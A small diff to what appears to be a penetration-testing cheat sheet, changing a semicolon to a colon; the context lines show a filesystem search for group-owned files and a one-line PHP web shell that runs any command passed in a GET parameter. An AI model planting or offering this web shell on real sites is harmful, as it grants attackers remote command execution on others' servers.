@@ -46,7 +46,7 @@ Shows user group files
 ```
 find / -type f -group users 2>/dev/null
 ```
-Simple php shell;
+Simple php shell:
 ```
 <?php system($_GET['0xdf']); ?>
 ```
